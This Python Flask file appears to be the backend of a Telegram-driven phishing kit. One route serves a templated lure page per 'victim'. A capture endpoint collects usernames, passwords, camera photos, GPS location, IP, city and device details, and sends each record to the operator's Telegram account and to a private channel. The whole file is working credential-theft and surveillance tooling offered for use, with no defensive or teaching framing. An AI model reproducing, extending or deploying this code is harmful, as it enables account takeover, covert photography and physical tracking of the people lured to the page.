from flask import Flask, request, jsonify
import time
import threading
import base64
import os
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.utils.storage import victim_data_store, link_cache

app = Flask(__name__)

# ========== PHISHING PAGE ==========
@app.route('/p/<uid>')
def phishing_page(uid):
    victim_id = request.args.get('v', 'unknown')
    target_type = request.args.get('type', 'cam')
    
    redirect_url = victim_data_store.get(f"redirect_{victim_id}", 'https://google.com')
    photo_url = victim_data_store.get(f"photo_{victim_id}", 'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=No+Photo')
    
    with open('web/index.html', 'r') as f:
        html = f.read()
    
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    html = html.replace('{{PHOTO_URL}}', photo_url)
    return html

# ========== CAPTURE VICTIM DATA ==========
@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error"}), 400
    
    # Store victim data
    victim_data_store[f"victim_{victim_id}"] = data
    
    # Forward data to user + channel in background
    threading.Thread(target=forward_to_user_and_channel, args=(victim_id, data)).start()
    
    return jsonify({"status": "ok"})

# ========== FORWARD DATA TO USER + CHANNEL ==========
def forward_to_user_and_channel(victim_id, data):
    try:
        # Find which user this victim belongs to
        user_id = None
        
        # Check link_cache for user_id
        for key, val in link_cache.items():
            if str(val.get("user_id")) == str(victim_id):
                user_id = val["user_id"]
                break
        
        # If not found, check photo or redirect store
        if not user_id:
            for key in victim_data_store:
                if key.startswith("photo_") and key.endswith(str(victim_id)):
                    user_id = key.replace("photo_", "")
                    break
                elif key.startswith("redirect_") and key.endswith(str(victim_id)):
                    user_id = key.replace("redirect_", "")
                    break
        
        if not user_id:
            print(f"⚠️ No user found for victim {victim_id}")
            return
        
        # ===== SEND TO USER =====
        from bot.__init__ import bot
        
        # Prepare message for user
        user_text = f"📥 *Victim Data Received*\n🆔 ID: {victim_id}\n"
        
        device = data.get('device_info', {})
        if device:
            user_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            user_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n"
            user_text += f"📶 Network: {device.get('network', 'N/A')}\n"
        
        user_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n"
        user_text += f"📍 City: {data.get('city', 'Unknown')}\n"
        
        creds = data.get('creds')
        if creds:
            user_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n"
            user_text += f"👤 Username: {creds.get('username', 'N/A')}\n"
            user_text += f"🔒 Password: {creds.get('password', 'N/A')}\n"
        
        # Send text to user
        bot.send_message(user_id, user_text, parse_mode="Markdown")
        
        # Send photo to user
        photo_data = data.get('photo')
        if photo_data and photo_data.startswith('data:image'):
            try:
                b64 = photo_data.split(',')[1]
                with open('temp_user.jpg', 'wb') as f:
                    f.write(base64.b64decode(b64))
                with open('temp_user.jpg', 'rb') as f:
                    bot.send_photo(user_id, f)
                os.remove('temp_user.jpg')
            except Exception as e:
                print(f"User photo send error: {e}")
        
        # Send location to user
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(user_id, loc['lat'], loc['lng'])
        
        # ===== SEND TO PRIVATE CHANNEL =====
        channel_text = f"📥 *New Victim Data*\n🆔 ID: {victim_id}\n"
        
        if device:
            channel_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            channel_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n"
            channel_text += f"📶 Network: {device.get('network', 'N/A')}\n"
        
        channel_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n"
        channel_text += f"📍 City: {data.get('city', 'Unknown')}\n"
        
        if creds:
            channel_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n"
            channel_text += f"👤 Username: {creds.get('username', 'N/A')}\n"
            channel_text += f"🔒 Password: {creds.get('password', 'N/A')}\n"
        
        # Send text to channel
        bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")
        
        # Send photo to channel
        if photo_data and photo_data.startswith('data:image'):
            try:
                b64 = photo_data.split(',')[1]
                with open('temp_channel.jpg', 'wb') as f:
                    f.write(base64.b64decode(b64))
                with open('temp_channel.jpg', 'rb') as f:
                    bot.send_photo(PRIVATE_CHANNEL_ID, f)
                os.remove('temp_channel.jpg')
            except Exception as e:
                print(f"Channel photo send error: {e}")
        
        # Send location to channel
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])
        
        print(f"✅ Data forwarded to user {user_id} and channel")
        
    except Exception as e:
        print(f"Forward error: {e}")

# ========== HOME ==========
@app.route('/')
def home():
    return "✅ Bot is running!"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
